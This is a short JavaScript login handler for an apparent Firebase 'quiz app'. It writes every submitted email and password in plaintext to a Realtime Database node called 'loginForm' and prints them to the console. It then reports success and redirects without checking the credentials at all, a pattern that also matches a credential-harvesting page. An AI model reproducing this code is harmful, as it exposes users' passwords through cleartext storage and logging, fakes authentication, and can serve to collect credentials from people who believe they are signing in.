const firebaseConfig = {
    apiKey: "AIzaSyBhSgOBskmDERAsca0wJ_BjA-EtUNHHMlg",
    authDomain: "quiz-app-25271.firebaseapp.com",
    databaseURL: "https://quiz-app-25271-default-rtdb.firebaseio.com",
    projectId: "quiz-app-25271",
    storageBucket: "quiz-app-25271.appspot.com",
    messagingSenderId: "506029858564",
    appId: "1:506029858564:web:aab24d415079a4e3c47a51"
  };
  
  // Initialize firebase
  firebase.initializeApp(firebaseConfig);
  
  var loginFormDB = firebase.database().ref("loginForm");
  document.getElementById('logForm').addEventListener('submit', submitForm);
  
  function submitForm(e) {
    e.preventDefault();
  
    var email = getElementVal('emails');
    var password = getElementVal('password');
  
    saveMsg(email, password);
    console.log(email, password);
    
    handleLoginSuccess();
    
    setTimeout(() => {
        window.location.href = 'main.html';
    }, 2000);
  }
  
  const saveMsg = (emails, password) => {
    var newLoginForm = loginFormDB.push();
  
    newLoginForm.set({
      emails: emails,
      password: password
    });
  };
  function handleLoginSuccess() {
    // Show the success alert
    document.getElementById('successAlert').classList.remove('hidden');
}
  
  const getElementVal = (id) => {
    return document.getElementById(id).value;
  }
  